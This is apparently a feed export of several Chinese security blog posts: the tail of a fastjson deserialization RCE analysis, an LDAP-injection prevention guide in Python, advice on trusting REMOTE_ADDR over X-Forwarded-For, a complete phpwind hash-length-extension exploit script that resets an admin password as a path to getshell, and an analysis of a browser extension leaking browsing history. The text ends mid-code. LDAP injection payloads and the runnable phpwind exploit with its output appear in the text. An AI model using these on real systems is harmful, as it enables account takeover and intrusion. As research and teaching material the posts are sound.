new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (LinkageError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; 在getTransletInstance调用defineTransletClasses，在defineTransletClasses方法中会根据_bytecodes来生成一个java类，生成的java类随后会被getTransletInstance方法用到生成一个实例，也也就到了最终的执行命令的位置Runtime.getRuntime.exec() 下面我们上一张调用链的图，,简单来说就是 1234567891011JSON.parseObject...JavaBeanDeserializer.deserialze...FieldDeserializer.setValue...TemplatesImpl.getOutputPropertiesTemplatesImpl.newTransformerTemplatesImpl.getTransletInstance...Runtime.getRuntime().exec 附上一张成功执行图： 5 总结poc影响jdk 1.7，1.8版本，1.6未测试，但是需要在parseObject的时候设置Feature.SupportNonPublicField，告诉个不幸的消息，该字段在fastjson1.2.22版本引入，这么一说的话就是poc只能在1.2.22和1.2.24版本区间起作用。最后给大家上个福利，github地址：完整的Intellij IDEA poc环境:https://github.com/shengqi158/fastjson-remote-code-execute-poc 本文地址：http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>反序列化</tag>
        <tag>poc</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python安全编码之预防LDAP注入]]></title>
    <url>%2F2016%2F12%2F01%2FPython%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E4%B9%8B%E9%A2%84%E9%98%B2LDAP%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1 LDAP简介LDAP（Lightweight Directory Access Protocol）轻量级目录协议，是一种在线目录访问协议，主要用于资源查询，是X.500的一种简便的实现。它是一种树结构，查询效率很高，插入效率稍低。目录和数据库有很多相似之处，都用于存放数据，可以查询插入，目录可以存放各种数据，而数据库的数据则有比较严格的约束条件。LDAP目录以入口(entry，目录中存储的基本信息单元)的形式存储和组织数据结构，每个入口有一个唯一标示自己的专属名称(distnguished name)，DN由系列RDNs(ralative distinguished names)组成。另外还有两个常见的结构，对象类和属性。对象类(object class)会定义独一的OID，每个属性(attribute)也会分配唯一的OID号码。 2 LDAP注入原理谈起LDAP注入首先得从LDAP的查询语法开始，基本的查询语法如下：search语法：attribute operator value search filter options:( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter)) 主要根据属性和值进行搜索，就如浏览网页时我们通常并不会浏览某个目录，而是其下存在的某个文件。 LDAP的URL形式为：ldap://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;，&lt;path&gt;:&lt;dn&gt;[?&lt;artribute&gt;[?&lt;scope&gt;?&lt;filter&gt;]] 例如： ldap://austin.ibm.com/ou=Austin,o=IBM 2.1 注入过程从注入原理来看，ldap注入分为and注入和or注入，先看and注入情形，假设查询结构如下(&amp;(user=username)(passwd=password)),这可能是采用采用LDAP进行登录验证的查询语句，其中username和password都是用户可控制的参数，那么可以在user处注入admin*)(objectClass=*)形成如下(&amp;(user=admin*)(objectClass=*))(passwd=password)) 有点小语法错误，如果在user处注入admin*)(objectClass=*))(&amp;(objectClass=*(&amp;(user=admin*)(objectClass=*))(|(objectClass=void)(passwd=passwd)) 无语法错误,对于openldap来说，只会执行第一个&amp;括号内的内容，由于objectClass=*恒为真，我们就能无需密码以admin用户的身份登录系统如果不允许两个过滤服务器的执行，则是(&amp;(user=username)(injected_filter)(passwd=password)) 对于or注入，查询表达式如下：(|(user=username)(email=email_addr))假如username可控，即可注入username*)(objectClass=void))(|objectClass=void形成(|(user=username)(objectClass=void))(|objectClass=void)(email=email_addr)),由于objectClass=void恒为假，所以只有user=username的时候整个值为真。 2.2 渗透技巧对于渗透测试来说，还是要看报错，比如输入\,如果关闭了报错接口，可以通过正确参数后加”“字符，如果返回一致，必有蹊跷，很有可能就是一个注入点，接着就可以尝试盲注的方式，简单的盲注就是”a*”这种方式。 2.3 调试与验证在代码审计过程中，有些时候代码结构庞大，为了验证是否存在注入点，不好直接改写在python命令行中执行，那么就可以尝试打开ldap的日志，这样直接从url参数中加入注入元素，就能很好的观察注入的效果。下面是打开ldap日志的方法。一般的文章中都是打开syslogd，如果已经替换成了rsyslogd，也不要惊慌。rsyslogd是syslogd的升级包，原来的配置文件都还可用，增加了很多新功能，如能监听端口或者IP。下面就是打开LDAP日志的步骤： 1.在slapd.conf中加一行： 4095 ```12342.在/etc/rsyslog.conf 中加入ldap日志文档：```local4.* /var/log/ldap.log 3.在终端用命令重启syslog服务 service rsyslog restart```1234564.在/var/log/下可以找到一个ldap.log文件随着时间增长，这个日志会增长较快，注意删除。有时候为了查看实际的搜索结果，可以下载ldap的相关工具，在windows下推荐使用LDAP Administrator，linux下可以使用ldapsearch工具，ldapsearch具体用法如下：```ldapsearch -h 10.5.5.5 -p 389 -D &apos;o=customer&apos; -W -x -b &quot;o=customer&quot; &quot;cn=645*&quot; binddn bind DN123-W prompt for bind password-x Simple authentication-b basedn base dn for search 3 python 安全编码如何在python中防止LDAP注入呢？首先我们来看下简单的ldap连接，绑定再到查询的示例，这个查询是存在注入风险的，请不要模仿，请不要模仿，请不要模仿。 1234567In [70]: import ldapIn [71]: l = ldap.initialize(&apos;ldap://10.5.0.220:389&apos;)In [76]: l.bind(&apos;LDAP_ROOTDN&apos;,&apos;LDAP_ROOTPW&apos;)Out[76]: 4In [77]: l.search_s(&apos;LDAP_ROOTDN&apos;,ldap.SCOPE_SUBTREE,&apos;(cn=645*)&apos;)Out[77]:[(&apos;cn=64502d93-a8ab-3ba1-991a-74cfde8cb333,cn=admin,o=3333049f-92d2-3c3a-91c2-6e1ef4c6a6bf,o=customer&apos;,....... 而且ldap的查询接口不像sql结果，有参数化查询，ldap的接口只能从参数过滤上做功夫来防止注入,但是好歹ldap提供了一个安全过滤接口ldap.filter.在这个接口中有escape_filter_chars函数，源码如下： 123456789101112131415161718192021222324252627282930def escape_filter_chars(assertion_value,escape_mode=0): """ Replace all special characters found in assertion_value by quoted notation. escape_mode If 0 only special chars mentioned in RFC 4515 are escaped. If 1 all NON-ASCII chars are escaped. If 2 all chars are escaped. """ if escape_mode: r = [] if escape_mode==1: for c in assertion_value: if c &lt; '0' or c &gt; 'z' or c in "\\*()": c = "\\%02x" % ord(c) r.append(c) elif escape_mode==2: for c in assertion_value: r.append("\\%02x" % ord(c)) else: raise ValueError('escape_mode must be 0, 1 or 2.') s = ''.join(r) else: s = assertion_value.replace('\\', r'\5c') s = s.replace(r'*', r'\2a') s = s.replace(r'(', r'\28') s = s.replace(r')', r'\29') s = s.replace('\x00', r'\00') return s 源码解读如下：如果未设置转义模式，就将\,*,(,),\x00这5个字符转成其ascii码值。那么如何过滤呢？代码如下： 1name=ldap.filter.escape_filter_chars(name) 经过过滤之后再丢到查询参数中。或者使用filter_format,注意占位符%s和参数的对应关系。 123current_app.setdefault('LDAP_GROUP_OBJECT_FILTER', '(&amp;(objectclass=Group)(userPrincipalName=%s))')query = ldap.filter.filter_format( current_app['LDAP_USER_OBJECT_FILTER'], (user,)) 总之记住一条，ldap的搜索参数是需要手工过滤的。 参考链接： http://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>LDAP注入</tag>
        <tag>安全编码</tag>
        <tag>预防注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取用户IP的正确姿势]]></title>
    <url>%2F2016%2F11%2F01%2F%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7IP%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[如何获取用户的IP，这个需求简直是太常见了，像登录入口，注册入口，投票，日志记录，api接口中判断同一个ip单位时间内的请求数，可是怎么去获取用户的真实IP呢？网上的代码很多，好多人直接拿来就用，却没有想到带来了很大的安全问题。 1 代码示例12345678910&lt;?phpif(!empty($_SERVER['HTTP_CLIENT_IP']))&#123; $myip = $_SERVER['HTTP_CLIENT_IP'];&#125;else if(!empty($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $myip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123; $myip= $_SERVER['REMOTE_ADDR'];&#125;echo $myip;?&gt; 这是网上的一个示范例子，我们很多同事也这么写，上面这个例子是php实现的，由于HTTP_CLIENT_IP,HTTP_X_FORWARDED_FOR,HTTP_X_FORWARDED,HTTP_X_CLUSTER_CLIENT_IP,HTTP_FORWARDED_FOR,HTTP_FORWARDED，HTTP_VIA (经过的 Proxy)这些以HTTP打头的server变量都是用户可控的，由此可导致xss，认证绕过等缺陷。下面我们看下python的例子： 12345678def get_ip(request): try: return request.META['HTTP_X_FORWARDED_FOR'] except KeyError: try: return request.META['HTTP_X_REAL_IP'] except KeyError: return request.META.get('REMOTE_ADDR', None) 也是由于客户端变量可控导致获取的ip可为任意值。在此例中,X-Real-IP是nginx特有的，通过配置proxy_set_header X-Real-IP $remote_addr;从REMOTE_ADDR中取值。 2 X-Forwarded-For和 REMOTE_ADDR的区别REMOTE_ADDR代表着客户端的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个值是不可伪造的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，用户的请求会经过代理再到服务器，这个时候REMOTE_ADDR会被设置为代理机器的IP值。 正如前面所说，有了代理就获取不了用户的真实IP，由此X-Forwarded-For应运而生，它是一个非正式协议，在请求转发到代理的时候代理会添加一个X-Forwarded-For头，将连接它的客户端IP（也就是你的上网机器IP）加到这个头信息里，这样末端的服务器就能获取真正上网的人的IP了。 假设用户的请求顺序如下： 网民电脑ip-&gt;代理服务器1–&gt;代理服务器2–&gt;目标服务器 REMOTE_ADDR:代理服务器2的IP值 X-Forwarded-For就是：网民电脑IP，代理1的IP，代理2的IP 在这里只有REMOTE_ADDR是可信的，其他从客户端获取的数据都是不可信的，都是可伪造的。下面简单示例下一个篡改X-Forwarded-For的情况： 12345678910GET / HTTP/1.1Host: www.myip.cnCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflate, sdchAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: Hm_lvt_380ffd3c2225d34ca2087c6970395366=1473755162; Hm_lpvt_380ffd3c2225d34ca2087c6970395366=1473755299; sc_is_visitor_unique=rx4067297.1473755300.43C8C2ACB3CA4FAAEB8885235516D36A.1.1.1.1.1.1.1.1.1X-Forwarded-For: 127.0.0.111111 返回信息是： 1&lt;font style="font-family:Arial,Helvetica,Sans Serif;font-size: 24pt;" color="#0066CC"&gt;&lt;b&gt;您的IP地址: 127.0.0.111111&lt;/b&gt;&lt;/font&gt; 3 正确的代码示例：在X-Forwarded-For信息头中可以提取真实的用户IP，但是这个IP是可以伪造的，如果从X-Forwarded-For提取IP作为用户的IP对于存在登录次数，api速率限制等一些接口是致命的缺陷，因为任意构造出无数的合法或者非法IP地址。而REMOTE_ADDR只是服务器前端的IP地址，如果没有代理就是用户的真实地址。这个是不可伪造的，而且代理是有限的，可以基于此来获取IP。在wordpress中，获取客户的IP地址代码如下： 1$remote_ip = preg_replace( '/[^0-9a-fA-F:., ]/', '', $_SERVER['REMOTE_ADDR'] ); 如果是python代码的话： 1remote_ip = request.META.get('REMOTE_ADDR', None) 当然上述代码也存在缺陷，就是服务器端开了nginx反向代理的时候，每次获取的都是反向代理的IP，这不是我们的预期，需要nginx在配置反向代理的时候做一定设置并且修改代码。如： 123proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 或者采用realip模块，配置如下： 12set_real_ip_from 10.1.10.0/24;real_ip_header X-Forwarded-For; 在存在反向代理的情况下，如果直接获取REMOTE_ADDR，得到的是反向代理IP的值，从上面的配置也可以看出，在反向代理nginx的配置中将REMOTE_ADDR赋给了X-Real-IP，那么也是从X-Real-IP中来获取用户的IP，如下才是正确的获取用户IP的方式： 12345def get_ip(request): try: return request.META[&apos;HTTP_X_REAL_IP&apos;] except KeyError: return request.META.get(&apos;REMOTE_ADDR&apos;,None) 4 总结X-Forwarded-For可被用户伪造，不应该被信任；REMOTE_ADDR是使用“REMOTE_ADDR”机器的前一个建立tcp连接的机器的地址，是不可伪造的，在无代理时可以理解为用户的IP地址，有反向代理时，先将REMOTE_ADDR赋给X-Real-IP，最后可以从X-Real-IP中获取用户的IP。 参考文献： http://gong1208.iteye.com/blog/1559835 http://devco.re/blog/2014/06/19/client-ip-detection/ http://blog.pengqi.me/2013/04/20/remote-addr-and-x-forwarded-for/]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>X-Forward-For</tag>
        <tag>REMOTE_ADDR</tag>
        <tag>用户IP</tag>
        <tag>nginx</tag>
        <tag>反向代理</tag>
        <tag>HTTP_X_FORWARDED_FOR</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phpwind利用hash长度扩展攻击修改后台密码getshell]]></title>
    <url>%2F2016%2F08%2F01%2FPhpWind%20%E5%88%A9%E7%94%A8hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BF%AE%E6%94%B9%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81getshell%2F</url>
    <content type="text"><![CDATA[#1 哈希长度扩展攻击 ##1.1 简介哈希长度扩张攻击（hash length attack）是一类针对某些哈希函数可以额外添加一些信息的攻击手段，适用于已经确定哈希值和密钥长度的情况。哈希值基本表示如下H（密钥||消息），即知道了哈希值和密钥的长度，可以推出H（密钥||消息||padding||append）的哈希值，padding是要填充的字段，append则是要附加的消息。其实如果不知道密钥长度，可通过暴力猜解得到，已知的有长度扩展攻击缺陷的函数有MD5，SHA-1，SHA-256等等,详细的攻击原理可参考Everything you need to know about hash length extension attacks ##1.2 利用这里推荐有python扩展的HashPump，HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。安装：pip install hashpumpy1234567891011root@kali:~/python# hashpump --helpHashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength] HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack. -h --help Display this message. -t --test Run tests to verify each algorithm is operating properly. -s --signature The signature from known message. -d --data The data from the known message. -a --additional The information you would like to add to the known message. -k --keylength The length in bytes of the key being used to sign the original message with. Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support. &lt;Developed by bwall(@botnet_hunter)&gt; -s参数对应的就是H(密钥||消息)中的哈希值，-d参数对应着消息，-k参数对应着密钥的长度，-a则是要附加的消息。123root@kali:~/python# hashpump -s &quot;ebfe0fff1806cfe6186c6a0b172e8148&quot; -d &quot;1465895192adoAvatarcavatarmapitypeflashuid2uidundefined&quot; -k 32 -a namespacesiteaeditUsercusermapipasswordGongFang9uid14daee9a61955a1c17319f4c1664d11df1465895192adoAvatarcavatarmapitypeflashuid2uidundefined\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x00\x00\x00namespacesiteaeditUsercusermapipasswordGongFang9uid1 最后提供一个哈希扩展攻击在线工具：http://sakurity.com/lengthextension，需要注意的长度是密钥+消息的总长度，详情见图：![此处输入图片的描述][2] #2 phpwind利用点分析phpwind会在每次请求的时候校验密钥，具体的对应函数如下：123456789101112131415public function beforeAction($handlerAdapter) &#123; parent::beforeAction($handlerAdapter); $charset = &apos;utf-8&apos;; $_windidkey = $this-&gt;getInput(&apos;windidkey&apos;, &apos;get&apos;); $_time = (int)$this-&gt;getInput(&apos;time&apos;, &apos;get&apos;); $_clientid = (int)$this-&gt;getInput(&apos;clientid&apos;, &apos;get&apos;); if (!$_time || !$_clientid) $this-&gt;output(WindidError::FAIL); $clent = $this-&gt;_getAppDs()-&gt;getApp($_clientid); if (!$clent) $this-&gt;output(WindidError::FAIL); if (WindidUtility::appKey($clent[&apos;id&apos;], $_time, $clent[&apos;secretkey&apos;], $this-&gt;getRequest()-&gt;getGet(null), $this-&gt;getRequest()-&gt;getPost()) != $_windidkey) $this-&gt;output(WindidError::FAIL); $time = Pw::getTime(); if ($time - $_time &gt; 1200) $this-&gt;output(WindidError::TIMEOUT); $this-&gt;appid = $_clientid;&#125; 在这个函数中会提取windidkey，并且和WindidUtility::appKey生成的结果做对比，不同则退出，如过相同继续判断时间是否超时，超时也退出，appKey的实现如下：1234567891011121314151617public static function appKey($apiId, $time, $secretkey, $get, $post) &#123; // 注意这里需要加上__data，因为下面的buildRequest()里加了。 $array = array(&apos;windidkey&apos;, &apos;clientid&apos;, &apos;time&apos;, &apos;_json&apos;, &apos;jcallback&apos;, &apos;csrf_token&apos;, &apos;Filename&apos;, &apos;Upload&apos;, &apos;token&apos;, &apos;__data&apos;); $str = &apos;&apos;; ksort($get); ksort($post); foreach ($get AS $k=&gt;$v) &#123; if (in_array($k, $array)) continue; $str .=$k.$v; &#125; foreach ($post AS $k=&gt;$v) &#123; if (in_array($k, $array)) continue; $str .=$k.$v; &#125; return md5(md5($apiId.&apos;||&apos;.$secretkey).$time.$str);&#125; 在函数中md5(md5($apiId.&#39;||&#39;.$secretkey).$time.$str)的值是知道的，即windidkey，这个值在用户上传头像处泄露，md5($apiId.&#39;||&#39;.$secretkey)的长度是知道的，32bit，$time.$str参数是用户可控的，那么就满足了哈希扩展长度攻击，下面我们看下用户上传头像处的请求，右键查看源代码找到如下请求：1http://192.168.3.106/windid/index.php?m=api&amp;c=avatar&amp;a=doAvatar&amp;uid=2&amp;windidkey=b6f98f9e78105ca0ec4239de8478cd26&amp;time=1465977216&amp;clientid=1&amp;type=flash&amp;avatar=http://192.168.3.106/windid/attachment//avatar/000/00/00/2.jpg?r=18504 接着看实际构造的appKey的参数效果,这个可以根据trace的结果直接给出，具体如下：1md5(&apos;520a1e355b8cfc82e56ae578176d7f101465977216adoAvatarcavatarmapitypeflashuid2uidundefined&apos;) /var/www/html/src/windid/service/base/WindidUtility.php:54 md5($apiId.&#39;||&#39;.$secretkey)的值为520a1e355b8cfc82e56ae578176d7f10，$time为1465977216,$str为adoAvatarcavatarmapitypeflashuid2uidundefined,从appKey函数的实现来看，$str就是get，post请求进行取舍排序得到的。有了这个基础，根据hashpump公式，在post请求中加入我们的参数，并计算出合适的windidkey值，提交请求，就可达到目的。 #3 利用POC可利用如下的代码构造post请求，修改某uid用户的密码。如果修改的是管理员的密码，并且这管理员有相应的后台权限，那么我们就可以在后台getshell，利用脚本如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!env python# coding=utf-8import hashpumpyimport urllibimport urlparseimport urllib2import requestsdef md5hack(md5, ori_str, append, security_len): md5, message = hashpumpy.hashpump(md5, ori_str,append, security_len) quoted_message = urllib.quote(message) print &apos;md5 after hash length attacked:&apos;,md5 print &apos;message:&apos;,message print &apos;quote message:&apos;,quoted_message return (md5,quoted_message)def modify_passwd(ip, uid, target_uid, windidkey, padding, time, password=&quot;GongFang9&quot;): &quot;&quot;&quot;修改后台管理员的密码&quot;&quot;&quot; target_uid = target_uid #uid是后台管理的uid参数 host = &quot;http://&quot; + ip data = &quot;a=editUser&amp;c=user&amp;m=api&amp;uid=&#123;0&#125;&amp;password=&#123;1&#125;&quot;.format(target_uid, password) url = &quot;&#123;0&#125;/windid/index.php?windidkey=&#123;1&#125;&amp;adoAvatarcavatarmapitypeflashuid&#123;2&#125;uidundefined=&#123;3&#125;&amp;clientid=1&amp;time=&#123;4&#125;&amp;namespace=site&quot;.format(host,windidkey,uid,padding,time) print &apos;url:&apos;,url print &apos;data:&apos;,data r = requests.post(url,data=data) #r = requests.post(url,data=data,headers=headers) print r.text if r.text.strip() == &quot;1&quot;: print &apos;modify password Succeed&apos; else: print &apos;failed&apos;if __name__ == &quot;__main__&quot;: &quot;&quot;&quot;点开用户头像上传处,右键查看源码,搜索windidkey,拷贝含flash字段的那个request作为r参数&quot;&quot;&quot; r = &quot;&quot;&quot;http%3A%2F%2F192.168.3.106%2Fwindid%2Findex.php%3Fm%3Dapi%26c%3Davatar%26a%3DdoAvatar%26uid%3D5%26windidkey%3D1eb5af71d002ac89e22c0170806b0fe8%26time%3D1466416702%26clientid%3D1%26type%3Dflash&amp;avatar=http%3A%2F%2F192.168.3.106%2Fwindid%2Fattachment%2F%2Favatar%2F000%2F00%2F00%2F5.jpg%3Fr%3D78057&quot;&quot;&quot; request = urlparse.urlparse(urllib.unquote(r)) querys = [item for item in request.query.split(&quot;&amp;&quot;)] query_dict = &#123;item.split(&quot;=&quot;)[0]:item.split(&quot;=&quot;)[1] for item in querys&#125; ori_md5 = query_dict.get(&quot;windidkey&quot;) time = query_dict.get(&apos;time&apos;) uid = query_dict.get(&apos;uid&apos;) ori_str = &quot;&#123;0&#125;adoAvatarcavatarmapitypeflashuid&#123;1&#125;uidundefined&quot;.format(time,uid) password = &quot;test123&quot; ip = &quot;192.168.3.173&quot; ip = &quot;192.168.3.106&quot; target_uid = 3 post_append= &quot;a=getConfig&amp;c=config&amp;m=api&amp;id=1&quot; post_append= &quot;a=editUser&amp;c=user&amp;m=api&amp;uid=&#123;0&#125;&amp;password=&#123;1&#125;&quot;.format(target_uid,password) post = &quot;&quot;.join(sorted([item.replace(&quot;=&quot;,&quot;&quot;) for item in post_append.split(&quot;&amp;&quot;)]))# security = &quot;d2edc0a3340df65cb66387464f3adfc1&quot;# ori_str = &quot;1465784719adoAvatarcavatarmapitypeflashuid2uidundefined&quot; security_len = 32#phpwind计算windidkey 公式md5(md5($apiId.&apos;||&apos;.$secretkey).$time.$str),md5值的长度是32 print &apos;hashmd5:&apos;,ori_md5 print &apos;security len:&apos;, security_len print &apos;ori_str&apos;, ori_str append = &apos;agetcappid1mapi&apos; append = &quot;namespacesite&quot; + post print &apos;post&apos;,append (md5,quoted_message) = md5hack(ori_md5, ori_str, append, security_len) padding = quoted_message[quoted_message.index(&quot;%&quot;):quoted_message.rindex(&quot;%&quot;)+3] modify_passwd(ip, uid, target_uid, md5, padding, time, password) 运行之后得到123456789101112root@kali:~/python# python md5hack.pyhashmd5: 4d8971d0d2556d5dcbeb3b0f10e41429security len: 32ori_str 1466474956adoAvatarcavatarmapitypeflashuid10uidundefinedpost namespacesiteaeditUsercusermapipasswordtangTest3uid3md5 after hash length attacked: e46e0aaddbd4e008077535a4dafab3f5message: 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined▒▒namespacesiteaeditUsercusermapipasswordtangTest3uid3quote message: 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%02%00%00%00%00%00%00namespacesiteaeditUsercusermapipasswordtangTest3uid3url: http://192.168.3.173/windid/index.php?windidkey=e46e0aaddbd4e008077535a4dafab3f5&amp;adoAvatarcavatarmapitypeflashuid10uidundefined=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%02%00%00%00%00%00%00&amp;clientid=1&amp;time=1466474956&amp;namespace=sitedata: a=editUser&amp;c=user&amp;m=api&amp;uid=3&amp;password=test1231modify password Succeed 代码中修改uid为3的账户的密码为GongFang7，假设该用户具有后台管理员权限，进入后台getshell，具体的getshell可参考http://www.wooyun.org/bugs/wooyun-2016-0175518]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>hash length attack</tag>
        <tag>hashpump</tag>
        <tag>getshell</tag>
        <tag>哈希长度扩展攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小心浏览器插件窃取你的隐私]]></title>
    <url>%2F2016%2F05%2F01%2F%E5%B0%8F%E5%BF%83%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E7%AA%83%E5%8F%96%E4%BD%A0%E7%9A%84%E9%9A%90%E7%A7%81%2F</url>
    <content type="text"><![CDATA[浏览器插件已经成为了浏览器的必备品，但是市场上的插件也良莠不齐，甚至部分插件切换用户隐私，如浏览器的历史记录。笔者就遇到了这样一个插件，就是著名的手势插件：crxMouse Chrome Gestures，更可气的是已经用了这个插件一年多了。 #1 简单介绍：用Google搜索crxMouse Chrome Gestures导向到google市场，可以看到这款插件的简单介绍。原名:Gestures for Chrome(TM)汉化版.方便,快捷,充分发掘鼠标的所有操作.功能包括:鼠标手势,超级拖曳,滚轮手势,摇杆手势,平滑滚动,标签页列表等.本扩展致力于通过鼠标来实现一些功能操作,充分挖掘鼠标的所有操作.功能包括:鼠标手势,超级拖曳,滚轮手势,摇杆手势,平滑滚动,标签页列表等目前在google市场上这款插件有30万的用户，累计评价5000，其中很大一部分是国内用户，影响还是非常广泛的。 #2 验证窃取行为通过wireshark抓包可以看到两个分别发送到s808.searchelper.com和s1808.searchelper.com的请求，直接上图： 从origin可以看出，请求是来源于浏览器插件，标记为：jgiplclhploodgnkcljjgddajfbmafmp，可以通过chrome的chrome://extensions/找到该id对应的插件，就是，其对应的系统目录为 12C:\Users\[用户]\AppData\Local\Google\Chrome\User Data\Default\Extensions\jgiplclhploodgnkcljjgddajfbmafmp ```，我们可以通过分析其代码发现其实现，这个后续再讲。细心的读者可能会看到post请求段被加密了，看结构像是base64，尝试用base64解码，还是base64编码格式，再次解码，得到如下数据： s=808&amp;md=21&amp;pid=SjOa3PgqWSHYapU&amp;sess=314039255259558500&amp;q=http://bbs.pediy.com/showthread.php?t=179524&amp;prev=http://bbs.pediy.com/forumdisplay.php?f=161&amp;link=1&amp;sub=chrome&amp;hreferer=http://bbs.pediy.com/forumdisplay.php?f=161&amp;tmv=301512s=808就代表着服务器s808,pid即userid，sess是用户本地标记session，sub代表着浏览器类型，q代表当前页面，prev代表着从哪个页面过来，也就是referer的作用，hreferer就也记录着referer字段有了这些数据就可以分析用户行为，可以供搜索引擎，其实百度统计和google统计也是干同样的事，甚至百度统计还有点击等的统计。就这样你的浏览行为被发送给了其他服务器，这不是最危险的，最危险的是你在浏览内网的一些页面也会被发送出去，内网的一些站点就很容易被泄露了。 接着我们看另外一个请求，这个请求是发送到s1808服务器上，具体请求如下：![s1808服务器的请求][4]，解密加密后的内容和发送到s808的请求基本一致，具体如下： s=1808&amp;md=21&amp;pid=SjOa3PgqWSHYapU&amp;sess=765877789119258500&amp;sub=chrome&amp;q=http%3A//bbs.pediy.com/showthread.php%3Ft%3D179524&amp;hreferer=http%3A//bbs.pediy.com/forumdisplay.php%3Ff%3D161&amp;prev=http%3A//bbs.pediy.com/forumdisplay.php%3Ff%3D161&amp;tmv=4015&amp;tmf=112345678910111213141516171819这里就有点搞不太清楚发这样一个备份请求的原因了，难道仅仅是备份，有待思考，为了更好的弄清楚该插件还有没有其他危险行为，接下来我们分析插件的实现。#3 恶意插件实现插件的恶意行为集中在upalytics_ch.js代码中，安装后的初始化代码：```jsthis.initOnceAfterInstall = function() &#123; if (!utils.db.get(&quot;userid&quot;)) &#123; var id = utils.createUserID(); utils.db.set(&quot;userid&quot;, id) &#125; if (!utils.db.get(&quot;install_time&quot;)) &#123; var now = (new Date).getTime() / 1E3; utils.db.set(&quot;install_time&quot;, now) &#125; if (!utils.db_type.get(&quot;tmv&quot;)) &#123; var now = (new Date).getTime() / 1E3; utils.db_type.set(&quot;tmv&quot;, SIM_ModuleConstants._TMV); &#125;&#125;; 在初始化中生成userid，获取install_time，twv字段存放在本地localstorage中，接着会创建各种调用addListener接口来创建监听器，当tab页更新，替换，激活的时候就会调用相应的请求发送相应的函数，extension_onRequest则是发送到s808服务器，tabs_onUpdated,tabs_onActivated,tabs_onReplaced则是发送请求到s1808服务器，具体代码如下：12345678910this.start = function() &#123; try &#123; chrome.extension.onRequest.addListener(extension_onRequest); chrome.tabs.onUpdated.addListener(tabs_onUpdated); chrome.tabs.onActivated.addListener(tabs_onActivated); chrome.tabs.onReplaced.addListener(tabs_onReplaced) &#125; catch (e) &#123; log.SEVERE("8835", e) &#125;&#125; 下面我们简单分析下发送到s808.searchelper.com的related请求的代码，已简化，简化部分主要是去除一些google搜索的跳转，去除docType非html类型的，去除间隔时间很短的。 123456789101112131415161718192021222324252627function extension_onRequest(request, sender, sendResponse) &#123; var prev_state = tabs_states[tabId]; tabs_states[tabId] = change_status; if (res_prev_url == tab_url &amp;&amp; prev_state != change_status)&#123; log.ERROR("ERROR 8002 ??"); return &#125; if(res_prev_url == null || res_prev_url.length == 0) &#123; res_prev_url = last_prev; &#125; last_prev = tab_url; var data = "s=" + SIM_Config_BG.getSourceId() + "&amp;md=21&amp;pid=" + utils.db.get("userid") + "&amp;sess=" + SIM_Session.getSessionId() + "&amp;q=" + encodeURIComponent(tab_url) + "&amp;prev=" + 